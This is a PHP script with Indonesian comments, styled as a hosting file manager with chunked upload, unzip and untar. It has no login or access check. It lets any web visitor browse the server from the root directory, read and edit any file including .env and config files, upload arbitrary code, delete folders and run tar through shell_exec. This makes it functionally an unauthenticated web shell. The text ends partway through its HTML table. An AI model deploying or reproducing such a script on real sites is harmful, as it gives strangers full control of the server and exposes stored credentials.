<?php
/**
 * File Manager + Chunked Upload + Untar Strip Folder
 * Compatible: PHP 7.3 - 8.5 (LiteSpeed / CloudLinux / GoDaddy)
 * Simpan sebagai: m.php
 * 
 * Fitur:
 * - Upload chunked (atasi HTTP 413)
 * - Untar dengan strip folder otomatis (--strip-components=1)
 * - Debug log ke debug.log
 * - Fallback PharData kalau shell_exec diblokir
 */

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

@ini_set('upload_max_filesize', '256M');
@ini_set('post_max_size', '256M');
@ini_set('max_execution_time', '300');
@ini_set('max_input_time', '300');
@ini_set('memory_limit', '256M');

define('DEBUG_LOG', __DIR__ . '/debug.log');
define('CHUNK_DIR', __DIR__ . '/.chunks');
define('CHUNK_SIZE_HINT', 400 * 1024); // 400 KB per chunk

// ============================================
// DEBUG LOGGER
// ============================================
function dbg($msg) {
    @file_put_contents(DEBUG_LOG, '[' . date('H:i:s') . '] ' . $msg . "\n", FILE_APPEND);
}

// ============================================
// HELPER FUNCTIONS
// ============================================
function rmrf($dir) {
    if (!is_dir($dir)) return false;
    foreach (scandir($dir) as $f) {
        if ($f === '.' || $f === '..') continue;
        $p = $dir . '/' . $f;
        if (is_link($p)) @unlink($p);
        elseif (is_dir($p)) rmrf($p);
        else @unlink($p);
    }
    return @rmdir($dir);
}

function copyDirRecursive($src, $dst) {
    if (!is_dir($src)) return;
    @mkdir($dst, 0755, true);
    $items = @scandir($src);
    if (!$items) return;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $s = $src . '/' . $item;
        $d = $dst . '/' . $item;
        if (is_dir($s)) {
            copyDirRecursive($s, $d);
        } else {
            @copy($s, $d);
        }
    }
}

function moveDirContent($src, $dst) {
    // Pindahkan semua isi folder $src ke $dst
    if (!is_dir($src)) return 0;
    $count = 0;
    $items = @scandir($src);
    if (!$items) return 0;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $from = $src . '/' . $item;
        $to   = rtrim($dst, '/') . '/' . $item;
        
        if (file_exists($to)) {
            // Kalau sudah ada, gabungkan
            if (is_dir($from) && is_dir($to)) {
                $count += moveDirContent($from, $to);
                @rmdir($from);
                continue;
            }
        }
        
        if (@rename($from, $to)) {
            $count++;
        } else {
            // Fallback: copy + delete
            if (is_dir($from)) {
                copyDirRecursive($from, $to);
                rmrf($from);
            } else {
                @copy($from, $to);
                @unlink($from);
            }
            $count++;
        }
    }
    return $count;
}

// ============================================
// BUAT FOLDER CHUNK
// ============================================
if (!is_dir(CHUNK_DIR)) @mkdir(CHUNK_DIR, 0755, true);

$is_ajax = (isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
            && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest');

// ============================================
// CURRENT DIR
// ============================================
$cd = isset($_REQUEST['d']) ? $_REQUEST['d'] : '';
$cd = str_replace(["\0", '\\'], '', $cd);
$cd = $cd === '' ? '/' : '/' . trim($cd, '/');
$path = $cd;
$real = realpath($path);
if ($real === false || !is_dir($real)) {
    $cd = '/';
    $path = '/';
    $real = '/';
} else {
    $path = $real;
}

function u($cd, $extra = '') {
    $q = [];
    if ($cd !== '/' && $cd !== '') $q['d'] = $cd;
    if ($extra) $q = array_merge($q, $extra);
    return '?' . http_build_query($q);
}

function respond($status, $message, $extra = []) {
    global $is_ajax;
    $out = array_merge(['status' => $status, 'message' => $message], $extra);
    if ($is_ajax) {
        header('Content-Type: application/json');
        echo json_encode($out);
        exit;
    }
    return $out;
}

// ============================================
// DETEKSI POST KOSONG
// ============================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' 
    && empty($_POST) && empty($_FILES) 
    && isset($_SERVER['CONTENT_LENGTH']) 
    && $_SERVER['CONTENT_LENGTH'] > 0) {
    
    $size = round($_SERVER['CONTENT_LENGTH'] / 1024 / 1024, 2);
    dbg("POST KOSONG! Content-Length={$size} MB");
    respond('error', "❌ POST kosong! Ukuran request {$size} MB, melebihi post_max_size.");
}

// ============================================
// CHUNKED UPLOAD API
// ============================================
if (isset($_POST['action'])) {
    $action = $_POST['action'];

    // --- MULAI ---
    if ($action === 'chunk_start') {
        $upload_id = preg_replace('/[^a-zA-Z0-9]/', '', $_POST['upload_id']);
        $total_chunks = (int) $_POST['total_chunks'];
        $filename = preg_replace('/[^A-Za-z0-9._-]/', '_', basename($_POST['filename']));
        
        $tmp_file = CHUNK_DIR . '/' . $upload_id . '.part';
        @file_put_contents($tmp_file, '');
        
        dbg("CHUNK_START: id={$upload_id} file={$filename} chunks={$total_chunks}");
        respond('ok', "Mulai upload {$filename} ({$total_chunks} potongan)");
    }

    // --- KIRIM CHUNK ---
    if ($action === 'chunk') {
        $upload_id = preg_replace('/[^a-zA-Z0-9]/', '', $_POST['upload_id']);
        $index     = (int) $_POST['index'];
        $data      = base64_decode($_POST['data'], true);

        if ($data === false) {
            respond('error', "Chunk {$index}: base64 invalid");
        }

        $chunk_file = CHUNK_DIR . '/' . $upload_id . '_' . $index . '.chunk';
        $written = @file_put_contents($chunk_file, $data);

        if ($written === false) {
            respond('error', "Chunk {$index}: gagal tulis");
        }

        respond('ok', "Chunk {$index} OK ({$written} bytes)");
    }

    // --- SELESAI ---
    if ($action === 'chunk_end') {
        $upload_id = preg_replace('/[^a-zA-Z0-9]/', '', $_POST['upload_id']);
        $filename  = preg_replace('/[^A-Za-z0-9._-]/', '_', basename($_POST['filename']));
        $total     = (int) $_POST['total_chunks'];

        $target = rtrim($path, '/') . '/' . $filename;

        if (!is_writable($path)) {
            respond('error', "Folder tidak writable: {$path}");
        }

        $fp = @fopen($target, 'wb');
        if (!$fp) {
            respond('error', "Gagal buka file target: {$target}");
        }

        $total_size = 0;
        $missing = [];
        for ($i = 0; $i < $total; $i++) {
            $chunk_file = CHUNK_DIR . '/' . $upload_id . '_' . $i . '.chunk';
            if (!is_file($chunk_file)) {
                $missing[] = $i;
                continue;
            }
            $data = @file_get_contents($chunk_file);
            fwrite($fp, $data);
            $total_size += strlen($data);
            @unlink($chunk_file);
        }
        fclose($fp);

        @unlink(CHUNK_DIR . '/' . $upload_id . '.part');

        if (!empty($missing)) {
            @unlink($target);
            respond('error', "Gagal gabung: chunk hilang (" . implode(',', $missing) . ")");
        }

        $actual = filesize($target);
        dbg("CHUNK_END: ✅ saved {$target} ({$actual} bytes)");
        respond('ok', "✅ Upload selesai: {$filename} (" . round($actual/1024, 1) . " KB)");
    }

    // --- BATALKAN ---
    if ($action === 'chunk_cancel') {
        $upload_id = preg_replace('/[^a-zA-Z0-9]/', '', $_POST['upload_id']);
        $total     = (int) $_POST['total_chunks'];
        for ($i = 0; $i < $total; $i++) {
            @unlink(CHUNK_DIR . '/' . $upload_id . '_' . $i . '.chunk');
        }
        @unlink(CHUNK_DIR . '/' . $upload_id . '.part');
        respond('ok', 'Upload dibatalkan');
    }
}

// ============================================
// UPLOAD MULTIPART
// ============================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    if ($file['error'] !== UPLOAD_ERR_OK) {
        $errs = [
            UPLOAD_ERR_INI_SIZE   => 'File > upload_max_filesize',
            UPLOAD_ERR_FORM_SIZE  => 'File > MAX_FILE_SIZE',
            UPLOAD_ERR_PARTIAL    => 'Upload terputus',
            UPLOAD_ERR_NO_FILE    => 'Tidak ada file',
            UPLOAD_ERR_NO_TMP_DIR => '🚨 upload_tmp_dir tidak ada',
            UPLOAD_ERR_CANT_WRITE => '🚨 Gagal tulis disk',
            UPLOAD_ERR_EXTENSION  => 'Upload dihentikan ekstensi',
        ];
        respond('error', '❌ ' . (isset($errs[$file['error']]) ? $errs[$file['error']] : 'Error: ' . $file['error']));
    }
    if (!is_writable($path)) {
        respond('error', "Folder tidak writable: {$path}");
    }
    $safe = preg_replace('/[^A-Za-z0-9._-]/', '_', basename($file['name']));
    $target = rtrim($path, '/') . '/' . $safe;
    if (move_uploaded_file($file['tmp_name'], $target)) {
        $sz = round(filesize($target) / 1024, 1);
        respond('ok', "✅ uploaded: {$safe} ({$sz} KB)");
    } else {
        respond('error', "❌ Gagal pindahkan ke {$target}");
    }
}

// ============================================
// DELETE FILE
// ============================================
if (isset($_GET['del'])) {
    $f = basename($_GET['del']);
    $p = rtrim($path, '/') . '/' . $f;
    if (is_file($p) && @unlink($p)) respond('ok', '✅ deleted: ' . $f);
    else respond('error', '❌ delete failed');
}

// ============================================
// RM -RF
// ============================================
if (isset($_GET['rmrf'])) {
    $f = basename($_GET['rmrf']);
    $p = rtrim($path, '/') . '/' . $f;
    if (is_dir($p) && rmrf($p)) respond('ok', '✅ folder dihapus: ' . $f);
    else respond('error', '❌ gagal hapus folder');
}

// ============================================
// NEW FOLDER
// ============================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['mkdir'])) {
    $n = preg_replace('/[^A-Za-z0-9._-]/', '_', basename($_POST['mkdir']));
    if ($n && @mkdir(rtrim($path, '/') . '/' . $n, 0755)) respond('ok', '✅ folder dibuat: ' . $n);
    else respond('error', '❌ gagal buat folder');
}

// ============================================
// RENAME
// ============================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['old']) && isset($_POST['new'])) {
    $o = basename($_POST['old']);
    $n = preg_replace('/[^A-Za-z0-9._-]/', '_', basename($_POST['new']));
    $po = rtrim($path, '/') . '/' . $o;
    $pn = rtrim($path, '/') . '/' . $n;
    if (file_exists($po) && @rename($po, $pn)) respond('ok', "✅ renamed: $o → $n");
    else respond('error', '❌ rename failed');
}

// ============================================
// EDIT
// ============================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['edit_file']) && isset($_POST['content'])) {
    $f = basename($_POST['edit_file']);
    $p = rtrim($path, '/') . '/' . $f;
    if (is_file($p) && @file_put_contents($p, $_POST['content']) !== false) respond('ok', '✅ saved: ' . $f);
    else respond('error', '❌ save failed');
}

// ============================================
// UNZIP (ZIP)
// ============================================
if (isset($_GET['unzip'])) {
    $f = basename($_GET['unzip']);
    $zipPath = rtrim($path, '/') . '/' . $f;
    
    dbg("--- UNZIP START ---");
    dbg("File: {$zipPath}");
    
    if (!is_file($zipPath)) respond('error', '❌ file tidak ditemukan');
    if (!class_exists('ZipArchive')) respond('error', '❌ ZipArchive tidak tersedia');
    if (!is_writable($path)) respond('error', "❌ Folder tidak writable: {$path}");
    
    $zip = new ZipArchive;
    if ($zip->open($zipPath) !== true) {
        respond('error', '❌ gagal buka zip');
    }
    
    // Cek top-level zip
    $top_level = [];
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $name = $zip->getNameIndex($i);
        $parts = explode('/', $name);
        if (!empty($parts[0])) $top_level[$parts[0]] = true;
    }
    
    $use_strip = (count($top_level) === 1);
    dbg("ZIP top-level: " . count($top_level) . " → strip=" . ($use_strip ? 'YES' : 'NO'));
    
    if ($use_strip) {
        // Extract ke folder temporary dulu
        $tmp_dir = rtrim($path, '/') . '/.__unzip_' . time();
        @mkdir($tmp_dir, 0755, true);
        
        $zip->extractTo($tmp_dir);
        $zip->close();
        
        // Pindahkan isi ke root
        $moved = moveDirContent($tmp_dir, $path);
        rmrf($tmp_dir);
        
        respond('ok', "✅ unzip sukses: {$moved} item langsung ke root");
    } else {
        $zip->extractTo($path);
        $count = $zip->numFiles;
        $zip->close();
        respond('ok', "✅ unzip sukses: {$count} file dari {$f}");
    }
}

// ============================================
// UNTAR (TAR.GZ / TGZ / TAR) — STRIP FOLDER
// ============================================
if (isset($_GET['untar'])) {
    $f = basename($_GET['untar']);
    $tarPath = rtrim($path, '/') . '/' . $f;
    
    dbg("--- UNTAR START ---");
    dbg("File: {$tarPath}");
    
    if (!is_file($tarPath)) {
        respond('error', "❌ File tidak ditemukan: {$f}");
    }
    if (!is_writable($path)) {
        respond('error', "❌ Folder tidak writable: {$path}");
    }
    
    $size = filesize($tarPath);
    dbg("Size: " . round($size / 1024, 1) . " KB");
    
    $is_gz  = (bool) preg_match('/\.(tar\.gz|tgz)$/i', $f);
    $is_tar = (bool) preg_match('/\.tar$/i', $f);
    
    $success   = false;
    $error_msg = '';
    $extracted = 0;
    $method_used = '';
    
    // ============================================
    // METODE 1: shell_exec tar dengan --strip-components
    // ============================================
    $shell_ok = function_exists('shell_exec') 
             && !in_array('shell_exec', array_map('trim', explode(',', ini_get('disable_functions'))));
    
    if ($shell_ok) {
        dbg("Method 1: shell_exec tar");
        
        // Deteksi top-level
        $cmd_list = $is_gz 
                  ? 'tar -tzf ' . escapeshellarg($tarPath) . ' 2>&1'
                  : 'tar -tf '  . escapeshellarg($tarPath) . ' 2>&1';
        $all_lines = @shell_exec($cmd_list);
        $lines = array_filter(explode("\n", trim($all_lines ?: '')));
        
        $top_level = [];
        foreach ($lines as $line) {
            $line = trim($line);
            if ($line === '') continue;
            $parts = explode('/', $line);
            $top = $parts[0];
            if ($top !== '') $top_level[$top] = true;
        }
        
        dbg("Top-level: " . count($top_level) . " → " . implode(', ', array_keys($top_level)));
        
        // Strip kalau cuma 1 folder
        $use_strip = (count($top_level) === 1);
        $strip_arg = $use_strip ? ' --strip-components=1' : '';
        
        dbg("Use strip: " . ($use_strip ? 'YES' : 'NO'));
        
        $cmd = 'cd ' . escapeshellarg($path) 
             . ' && tar -x' . ($is_gz ? 'zf' : 'f') . ' ' . escapeshellarg($tarPath) 
             . $strip_arg 
             . ' 2>&1';
        
        dbg("CMD: {$cmd}");
        $output = @shell_exec($cmd);
        $output = trim($output ?: '');
        dbg("Output: " . ($output ?: '(kosong)'));
        
        // Cek file baru
        clearstatcache();
        $files_after = @scandir($path);
        $total_now = count($files_after) - 2;
        
        if ($output === '') {
            // Sukses kalau tidak ada error
            $success = true;
            $method_used = 'tar CLI';
            $msg = $use_strip 
                 ? "✅ untar sukses: isi folder langsung ke root"
                 : "✅ untar sukses: file diekstrak";
            dbg("tar CLI OK");
        } else {
            $error_msg = 'tar CLI: ' . $output;
            dbg("tar CLI FAILED: {$output}");
        }
    } else {
        dbg("shell_exec tidak tersedia");
    }
    
    // ============================================
    // METODE 2: PharData + move isi folder
    // ============================================
    if (!$success && class_exists('PharData')) {
        dbg("Method 2: PharData");
        
        try {
            $work_path = $tarPath;
            $tmp_renamed = false;
            
            // PharData butuh .tgz untuk gz
            if ($is_gz && preg_match('/\.tar\.gz$/i', $f)) {
                $work_path = rtrim($path, '/') . '/.__work_' . time() . '.tgz';
                if (!@copy($tarPath, $work_path)) {
                    throw new Exception("Gagal copy ke .tgz");
                }
                $tmp_renamed = true;
            }
            
            // Extract ke folder temporary
            $tmp_extract = rtrim($path, '/') . '/.__untar_' . time();
            @mkdir($tmp_extract, 0755, true);
            
            $phar = new PharData($work_path);
            $count = $phar->count();
            dbg("PharData count: {$count}");
            
            $phar->extractTo($tmp_extract, null, true);
            dbg("Extract ke: {$tmp_extract}");
            
            // Cek isi folder temporary
            $items = @scandir($tmp_extract);
            $items = array_filter($items, function($x) { return $x !== '.' && $x !== '..'; });
            $items = array_values($items);
            
            dbg("Items di tmp: " . count($items) . " → " . implode(', ', $items));
            
            // Kalau cuma 1 folder → pindahkan isinya
            if (count($items) === 1 && is_dir($tmp_extract . '/' . $items[0])) {
                $single_dir = $tmp_extract . '/' . $items[0];
                dbg("Single folder detected: {$items[0]}, memindahkan isi...");
                $extracted = moveDirContent($single_dir, $path);
                @rmdir($single_dir);
            } else {
                // Banyak item → pindahkan semua
                $extracted = moveDirContent($tmp_extract, $path);
            }
            
            // Bersihkan
            rmrf($tmp_extract);
            if ($tmp_renamed) @unlink($work_path);
            
            if ($extracted > 0) {
                $success = true;
                $method_used = 'PharData';
                $msg = "✅ untar sukses: {$extracted} item langsung ke root";
                dbg("PharData OK: {$extracted} items");
            } else {
                $error_msg .= ' | PharData: 0 item';
            }
            
        } catch (Exception $e) {
            $error_msg .= ' | PharData: ' . $e->getMessage();
            dbg("PharData FAILED: " . $e->getMessage());
        }
    }
    
    // ============================================
    // HASIL
    // ============================================
    if ($success) {
        dbg("UNTAR SUCCESS via {$method_used}");
        respond('ok', $msg);
    } else {
        dbg("UNTAR FAILED: {$error_msg}");
        respond('error', "❌ Gagal untar: {$error_msg}");
    }
}

// ============================================
// LIST FILES
// ============================================
$dirs = [];
$files = [];
if ($dh = @opendir($path)) {
    while (($f = readdir($dh)) !== false) {
        if ($f === '.' || $f === '..') continue;
        // Sembunyikan file internal
        if (preg_match('/^\.__/', $f)) continue;
        $full = $path . '/' . $f;
        if (@is_dir($full)) {
            $dirs[] = ['name' => $f, 'time' => @filemtime($full) ?: 0];
        } elseif (@is_file($full)) {
            $files[] = [
                'name' => $f,
                'size' => @filesize($full) ?: 0,
                'time' => @filemtime($full) ?: 0,
            ];
        }
    }
    closedir($dh);
}
usort($dirs, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
usort($files, function($a, $b) { return strcasecmp($a['name'], $b['name']); });

// ============================================
// VIEW FILE
// ============================================
$view = null;
$content = '';
$is_text = false;
if (isset($_GET['v'])) {
    $v = basename($_GET['v']);
    $p = rtrim($path, '/') . '/' . $v;
    if (is_file($p)) {
        $view = $v;
        if (function_exists('finfo_open')) {
            $finfo = finfo_open(FILEINFO_MIME_TYPE);
            $mime = finfo_file($finfo, $p);
            finfo_close($finfo);
            $text_mimes = ['text/', 'application/json', 'application/xml',
                           'application/javascript', 'application/x-httpd-php',
                           'application/x-php', 'inode/x-empty'];
            foreach ($text_mimes as $tm) {
                if (strpos($mime, $tm) === 0) { $is_text = true; break; }
            }
        }
        if (!$is_text && preg_match('/\.(php|txt|html|css|js|json|xml|md|htaccess|env|ini|log|conf|sh|yml|yaml)$/i', $v)) {
            $is_text = true;
        }
        if ($is_text) {
            $content = @file_get_contents($p);
            if ($content === false) $content = '';
        }
    }
}

// ============================================
// BREADCRUMB
// ============================================
$crumbs = [['name' => '/', 'd' => '']];
$rel = trim($path, '/');
if ($rel !== '') {
    $parts = explode('/', $rel);
    $acc = '';
    foreach ($parts as $pp) {
        $acc = $acc ? $acc . '/' . $pp : $pp;
        $crumbs[] = ['name' => $pp, 'd' => '/' . $acc];
    }
}

function isZip($n) { return (bool) preg_match('/\.zip$/i', $n); }
function isTar($n) { return (bool) preg_match('/\.(tar|tar\.gz|tgz)$/i', $n); }

// ============================================
// INFO
// ============================================
$upload_limit = ini_get('upload_max_filesize');
$post_limit   = ini_get('post_max_size');
$tmp_dir      = ini_get('upload_tmp_dir') ?: sys_get_temp_dir();
$tmp_ok       = is_dir($tmp_dir) && is_writable($tmp_dir);
$disk_free    = @disk_free_space($path);
$dir_writable = is_writable($path);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>m · PHP <?= PHP_VERSION ?></title>
<style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:-apple-system,sans-serif;background:#0f172a;color:#e2e8f0;padding:16px;min-height:100vh}
    .w{max-width:1000px;margin:0 auto}
    h1{font-size:16px;color:#818cf8;margin-bottom:10px}
    .msg{padding:10px 14px;border-radius:8px;font-size:13px;margin-bottom:12px;word-break:break-all}
    .ok{background:#064e3b;color:#6ee7b7}
    .er{background:#7f1d1d;color:#fca5a5}
    .wn{background:#78350f;color:#fcd34d}

    .sysinfo{background:#1e293b;padding:12px 14px;border-radius:8px;font-size:11px;
        color:#94a3b8;margin-bottom:12px;display:grid;
        grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:6px}
    .sysinfo span b{color:#cbd5e1}
    .sysinfo span.ok::before{content:"✅ ";color:#10b981}
    .sysinfo span.er::before{content:"❌ ";color:#ef4444}

    .crumbs{background:#1e293b;padding:10px 14px;border-radius:8px;margin-bottom:12px;
        font-size:13px;display:flex;flex-wrap:wrap;align-items:center;gap:4px;overflow-x:auto}
    .crumbs a{color:#a5b4fc;text-decoration:none;font-weight:600;white-space:nowrap}
    .crumbs a:hover{text-decoration:underline}
    .crumbs .sep{color:#475569;margin:0 4px}
    .crumbs .cur{color:#94a3b8;font-weight:600;white-space:nowrap}

    .tb{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px;align-items:center}
    .tb .btn{padding:8px 14px;background:#4f46e5;color:#fff;border:none;border-radius:8px;
        font-weight:600;font-size:13px;cursor:pointer;text-decoration:none;display:inline-block}
    .tb .btn:hover{background:#4338ca}
    .tb .btn.gray{background:#334155}
    .tb .btn.gray:hover{background:#475569}
    .tb .btn.green{background:#10b981}
    .tb .btn.green:hover{background:#059669}

    .up{border:2px dashed #334155;border-radius:10px;padding:18px;text-align:center;
        cursor:pointer;background:#1e293b;transition:.2s;margin-bottom:12px}
    .up:hover,.up.over{border-color:#6366f1;background:#1e1b4b}
    .up p{font-size:13px;color:#94a3b8}
    .up .fn{margin-top:6px;font-weight:600;color:#a5b4fc;font-size:12px;word-break:break-all}
    input[type=file]{display:none}
    .p{display:none;height:20px;background:#1e293b;border-radius:6px;overflow:hidden;margin-bottom:12px}
    .pb{height:100%;width:0;background:#4f46e5;transition:.3s;display:flex;
        align-items:center;justify-content:center;font-size:10px;color:#fff;font-weight:600}

    .results{background:#0f172a;border:1px solid #1e293b;border-radius:8px;
        padding:12px;margin-bottom:12px;font-size:12px;max-height:250px;overflow-y:auto}
    .results .item{padding:6px 0;border-bottom:1px solid #1e293b;
        display:flex;justify-content:space-between;gap:10px;font-family:monospace;word-break:break-all}
    .results .item:last-child{border-bottom:none}
    .results .item.ok{color:#6ee7b7}
    .results .item.er{color:#fca5a5}
    .results .item.wn{color:#fcd34d}

    table{width:100%;border-collapse:collapse;font-size:13px}
    th,td{padding:9px 8px;text-align:left;border-bottom:1px solid #1e293b}
    th{background:#1e293b;color:#94a3b8;font-size:11px;font-weight:600;text-transform:uppercase}
    td{color:#cbd5e1;word-break:break-all;vertical-align:middle}
    .nm a{color:#a5b4fc;text-decoration:none;font-weight:600}
    .nm a:hover{text-decoration:underline}
    .nm .folder{color:#fbbf24}
    .nm .folder:hover{color:#f59e0b}
    .nm .zip{color:#f472b6}
    .sz{color:#64748b;font-size:11px;white-space:nowrap}
    .ac{display:flex;gap:5px;flex-wrap:wrap}
    .ac a,.ac button{padding:4px 9px;font-size:11px;border-radius:6px;border:none;
        cursor:pointer;text-decoration:none;color:#fff;font-weight:600}
    .v{background:#3b82f6}
    .e{background:#f59e0b}
    .d{background:#ef4444}
    .r{background:#8b5cf6}
    .z{background:#ec4899}
    .z:hover{background:#db2777}

    textarea{width:100%;min-height:500px;padding:14px;font-family:'Courier New',monospace;
        font-size:13px;background:#020617;color:#86efac;border:2px solid #334155;
        border-radius:8px;line-height:1.5;resize:vertical}
    textarea:focus{outline:none;border-color:#6366f1}
    .row{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;
        gap:10px;flex-wrap:wrap}
    .row h2{font-size:14px;color:#a5b4fc;word-break:break-all}
    .back{padding:6px 12px;background:#334155;color:#e2e8f0;text-decoration:none;
        border-radius:6px;font-size:12px;font-weight:600}
    .back:hover{background:#475569}
    .info{background:#1e293b;padding:10px 14px;border-radius:8px;font-size:12px;
        color:#94a3b8;margin-bottom:12px}
</style>
</head>
<body>
<div class="w">
    <h1>📁 m · PHP <?= PHP_VERSION ?> · Chunked + Untar Strip</h1>

    <div class="sysinfo">
        <span class="<?= $tmp_ok ? 'ok' : 'er' ?>"><b>tmp_dir:</b> <?= htmlspecialchars($tmp_dir) ?></span>
        <span class="<?= $dir_writable ? 'ok' : 'er' ?>"><b>dir writable:</b> <?= $dir_writable ? 'ya' : 'TIDAK' ?></span>
        <span><b>upload_max:</b> <?= htmlspecialchars($upload_limit) ?></span>
        <span><b>post_max:</b> <?= htmlspecialchars($post_limit) ?></span>
        <span><b>max_exec:</b> <?= ini_get('max_execution_time') ?>s</span>
        <span><b>memory:</b> <?= ini_get('memory_limit') ?></span>
        <span><b>disk_free:</b> <?= $disk_free ? round($disk_free/1024/1024/1024, 1) . ' GB' : '—' ?></span>
        <span class="<?= class_exists('ZipArchive') ? 'ok' : 'er' ?>"><b>ZipArchive:</b> <?= class_exists('ZipArchive') ? 'ada' : 'tidak' ?></span>
        <span class="<?= class_exists('PharData') ? 'ok' : 'er' ?>"><b>PharData:</b> <?= class_exists('PharData') ? 'ada' : 'tidak' ?></span>
        <span class="<?= function_exists('shell_exec') ? 'ok' : 'er' ?>"><b>shell_exec:</b> <?= function_exists('shell_exec') ? 'ada' : 'tidak' ?></span>
    </div>

    <?php if (!$dir_writable): ?>
        <div class="msg er">🚨 <b>Folder tujuan TIDAK writable!</b> Upload/extract pasti gagal.</div>
    <?php endif; ?>

    <?php if ($msg): ?>
        <div class="msg <?= strpos($msg, '✅') === 0 ? 'ok' : 'er' ?>"><?= htmlspecialchars($msg) ?></div>
    <?php endif; ?>

    <?php if ($view !== null): ?>
        <div class="row">
            <h2>📝 <?= htmlspecialchars($path . '/' . $view) ?></h2>
            <a class="back" href="<?= u($cd) ?>">← Kembali</a>
        </div>
        <?php if ($is_text): ?>
            <form method="post">
                <input type="hidden" name="edit_file" value="<?= htmlspecialchars($view) ?>">
                <input type="hidden" name="d" value="<?= htmlspecialchars($cd) ?>">
                <textarea name="content" spellcheck="false"><?= htmlspecialchars($content) ?></textarea>
                <button type="submit" style="padding:11px;width:100%;margin-top:12px;
                    background:#10b981;color:#fff;border:none;border-radius:8px;
                    font-weight:600;font-size:14px;cursor:pointer">💾 Simpan</button>
            </form>
        <?php else: ?>
            <div class="info">📄 File binary.<br>
                Ukuran: <?= round(filesize($path . '/' . $view) / 1024, 1) ?> KB<br>
                <a href="<?= htmlspecialchars($path . '/' . $view) ?>" target="_blank" style="color:#a5b4fc">Download</a>
            </div>
        <?php endif; ?>

    <?php else: ?>
        <div class="crumbs">
            <?php foreach ($crumbs as $i => $c): ?>
                <?php if ($i > 0): ?><span class="sep">/</span><?php endif; ?>
                <?php if ($i === count($crumbs) - 1): ?>
                    <span class="cur"><?= htmlspecialchars($c['name']) ?></span>
                <?php else: ?>
                    <a href="<?= u($c['d']) ?>"><?= htmlspecialchars($c['name']) ?></a>
                <?php endif; ?>
            <?php endforeach; ?>
        </div>

        <div class="tb">
            <button class="btn green" onclick="newFolder()">📁 Folder Baru</button>
            <a class="btn gray" href="<?= u($cd) ?>">🔄 Refresh</a>
            <?php if ($path !== '/'): ?>
                <?php $parent = dirname($path); if ($parent === '') $parent = '/'; ?>
                <a class="btn gray" href="<?= u($parent) ?>">⬆️ Naik</a>
            <?php endif; ?>
            <a class="btn gray" href="<?= u('/') ?>">🏠 /</a>
        </div>

        <div class="up" id="up">
            <p>📄 klik atau seret file ke <strong><?= htmlspecialchars($path) ?></strong></p>
            <p style="font-size:11px;margin-top:6px;color:#64748b">
                File besar otomatis dipecah jadi potongan kecil (chunked)
            </p>
            <div class="fn" id="fn"></div>
        </div>
        <input type="file" id="fi" multiple>
        <button id="bt" disabled style="width:100%;padding:11px;margin-bottom:12px;
            background:#4f46e5;color:#fff;border:none;border-radius:8px;
            font-weight:600;font-size:14px;cursor:pointer">⬆️ Upload</button>
        <div class="p" id="pg"><div class="pb" id="pgb">0%</div></div>

        <div class="results" id="results" style="display:none">
            <div style="color:#94a3b8;margin-bottom:6px;font-weight:600">📋 Hasil Upload:</div>
            <div id="resultsList"></div>
        </div>

        <?php if (empty($dirs) && empty($files)): ?>
            <div class="msg ok">📭 folder kosong / tidak ada akses</div>
        <?php else: ?>
            <table>
                <thead>
                    <tr><th>Nama</th><th>Ukuran</th><th>Waktu</th><th>Aksi</th></tr>
                </thead>
                <tbody>
                    <?php foreach ($dirs as $f): ?>
                    <tr>
                        <td class="nm">
                            <a class="folder" href="<?= u($path . '/' . $f['name']) ?>">
                                📁 <?= htmlspecialchars($f['name']) ?>
                            </a>
                        </td>
                        <td class="sz">—</td>
                        <td class="sz"><?= $f['time'] ? date('d/m H:i', $f['time']) : '—' ?></td>
                        <td>
                            <div class="ac">
                                <button class="r" onclick="doRename(<?= htmlspecialchars(json_encode($f['name']), ENT_QUOTES) ?>)">rename</button>
                                <button class="d" onclick="doRmrf(<?= htmlspecialchars(json_encode($f['name']), ENT_QUOTES) ?>)">hapus</button>
                            </div>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                    <?php foreach ($files as $f):
                        $z = isZip($f['name']);
                        $t = isTar($f['name']);
                    ?>
                    <tr>
                        <td class="nm">
                            <a <?= $z ? 'class="zip"' : '' ?>
                               href="<?= htmlspecialchars($path . '/' . $f['name']) ?>"
                               target="_blank">
                                <?= $z ? '🗜️' : ($t ? '📦' : '📄') ?>
                                <?= htmlspecialchars($f['name']) ?>
                            </a>
                        </td>
                        <td class="sz"><?= round($f['size']/1024, 1) ?> KB</td>
                        <td class="sz"><?= $f['time'] ? date('d/m H:i', $f['time']) : '—' ?></td>
                        <td>
                            <div class="ac">
                                <?php if ($z): ?>
                                    <a class="z" href="<?= u($cd, ['unzip' => $f['name']]) ?>"
                                       onclick="return confirm('Extract ZIP <?= htmlspecialchars($f['name'], ENT_QUOTES) ?> ke folder ini?\n\nKalau isinya cuma 1 folder, otomatis dibuang wrapper-nya.')">unzip</a>
                                <?php endif; ?>
                                <?php if ($t): ?>
                                    <a class="z" href="<?= u($cd, ['untar' => $f['name']]) ?>"
                                       onclick="return confirm('Extract TAR <?= htmlspecialchars($f['name'], ENT_QUOTES) ?> ke folder ini?\n\nKalau isinya cuma 1 folder, otomatis dibuang wrapper-nya.')">untar</a>
                                <?php endif; ?>
                                <a class="v" href="<?= u($cd, ['v' => $f['name']]) ?>">lihat</a>
                                <button class="r" onclick="doRename(<?= htmlspecialchars(json_encode($f['name']), ENT_QUOTES) ?>)">rename</button>
